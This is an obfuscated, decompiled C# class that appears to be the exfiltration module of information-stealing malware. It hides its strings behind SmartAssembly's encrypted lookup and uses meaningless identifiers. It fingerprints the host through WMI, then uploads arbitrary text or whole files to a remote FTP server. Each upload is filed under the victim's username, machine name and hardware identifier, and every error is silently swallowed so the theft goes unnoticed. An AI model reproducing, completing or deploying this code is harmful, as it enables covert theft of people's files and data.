using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

internal sealed class INGKCXIBXNZbRZv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string aWghHepTRDxy()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107367982));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107367993)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107367944);
			ManagementObject val3 = new ManagementObject(getString_0(107367971) + text2 + getString_0(107367930));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107367925)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107358992) : text;
		}
	}

	public static void YWinRvyDayTJu(string PpINrOGeshm = "URL", string aqScuJsJOqJWfILKP = "USERNAME", string AajdHFsllkOOaJh = "ACCESO", string uxiZwMzAspvqrd = "")
	{
		try
		{
			string text = aWghHepTRDxy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(PpINrOGeshm + getString_0(107371681) + Environment.UserName + getString_0(107371636) + Environment.MachineName + getString_0(107371647) + text + getString_0(107371642));
			ftpWebRequest.Method = getString_0(107367900);
			ftpWebRequest.Credentials = new NetworkCredential(aqScuJsJOqJWfILKP, AajdHFsllkOOaJh);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(uxiZwMzAspvqrd);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void KdrBgpJDCnhp(string nZesrqBLRg = "URL", string UgoFjzsZHrIuCNSOy = "USERNAME", string FzbgBYSPAeZEaiY = "ACCESO", string eDmlmMtsUVO = "")
	{
		try
		{
			string text = aWghHepTRDxy();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(nZesrqBLRg + getString_0(107371681) + Environment.UserName + getString_0(107371636) + Environment.MachineName + getString_0(107371647) + text + getString_0(107371647) + Path.GetFileName(eDmlmMtsUVO));
			ftpWebRequest.Method = getString_0(107367900);
			ftpWebRequest.Credentials = new NetworkCredential(UgoFjzsZHrIuCNSOy, FzbgBYSPAeZEaiY);
			byte[] array = File.ReadAllBytes(eDmlmMtsUVO);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static INGKCXIBXNZbRZv()
	{
		Strings.CreateGetStringDelegate(typeof(INGKCXIBXNZbRZv));
	}
}
